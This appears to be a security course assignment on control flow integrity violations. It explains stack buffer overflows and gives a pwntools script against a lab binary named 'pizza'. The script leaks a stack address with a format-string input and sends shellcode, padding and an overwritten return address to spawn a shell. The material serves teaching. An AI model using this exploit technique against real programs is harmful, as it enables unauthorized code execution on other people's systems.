# Control Flow Integrity Violation

The goal of this assignment is to write a python script using `pwntools` that executes the given program, leaks the stack offset, and spawns a shell. Through this exercise, we delve into the realm of control flow integrity violations, where unexpected inputs manipulate the program's execution flow, potentially leading to unauthorized access or unintended behavior.

We've learned about library injection, using a loader program to force another program into loading a library in a new thread. You've also created shellcode. There is a more direct method of injecting shellcode into vulnerable processes. The method involves giving unexpected input to a program that ends up altering what is in the instruction pointer register. With control of the IP register, attackers can make the program do whatever they want. There are many ways of doing this, but we will start with one of the oldest and simplest for this assignment: a buffer overflow.

Remember that the stack grows from large addresses towards smaller ones. However, arrays and strings are read from low addresses to high addresses. When a programmer allows more data to be written to a buffer than that buffer can hold, it will start overwriting things *higher* on the stack. This obviously will cause undefined behavior or segmentation faults. Attackers can make that undefined behavior into something useful.

One of the entries stored higher on the stack is the return address where the current function will return to once it finishes running the current function and reaches a RET instruction. Attackers' goal in a buffer overflow is to overwrite that return address, because they know it will get loaded into the IP register!

From there, there are several techniques, but we are going to practice the simplest. It works by injecting shellcode also into the buffer, and making sure that the IP register gets pointed to the first address in that shellcode. Then, just like in the shellcode tester from last assignment, the shellcode will get executed by the program, calling execve and replacing the current program with a shell the attacker can use.

To pull this off we need 3 things:

1. We need to find out how many bytes after the beginning of the buffer are there before the return address.
2. We need to inject padding bytes plus a new return address, plus some shellcode.
3. We need to be able to predict at what address our shellcode will be so we can return to it.

```python3
#!/usr/bin/env python3

from pwn import *

def printStack(core):
    rsp = core.rsp
    stack_before_rsp = core.read(rsp - 22 * 8, 22 * 8)  # 22 elements before RSP
    stack_after_rsp = core.read(rsp, 22 * 8)  # 22 elements after RSP

    print("\nStack:")
    for i in range(0, len(stack_before_rsp), 8):
        address = rsp - 22 * 8 + i
        value = core.read(address, 8)
        arrow = "<---------- RSP" if address == rsp else "    "  # Point to RSP
        print(f"{hex(address)}\t{value}\t\t\t\t\t\t\t\t\t{arrow}")

    for i in range(0, len(stack_after_rsp), 8):
        address = rsp + i
        value = core.read(address, 8)
        arrow = "<---------- RSP" if address == rsp else "    "  # Point to RSP
        print(f"{hex(address)}\t{value}\t\t\t\t\t\t\t\t\t{arrow}")

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

getname_address = elf.symbols["getname"]

#print(hex(getname_address))

#print(shellcraft.amd64.linux.sh())
#exit()

shellcode = asm(shellcraft.amd64.linux.sh())



input1 = b"%p %p %p %p %p %p %p %p %p"



victim = process("./pizza")

# Recieve Welcome Message
print(str(victim.recvline(), "latin-1"))

# Send Name
victim.sendline(input1)
# Recieve stack address leak output
leak = str(victim.recvline(), "latin-1")
print(leak)

# Send numberof pizzas and recieve output
victim.sendline(b"10")
print(str(victim.recvline(), "latin-1"))

# SHELL CODE + "A"*?? + NEW RET_ADDRESS
retAddr = int(leak.split(" ")[7], 16) - 112
input2 = shellcode + b"A"*88 + retAddr.to_bytes(8, 'little')

victim.sendline(input2)
#print(str(victim.recvline(), "latin-1"))


victim.interactive()
#core = victim.corefile

#printStack(core)

# print(disasm(core.read(core.rip, 8)))
# print( core.read( core.rsp, 100))


exit()
```
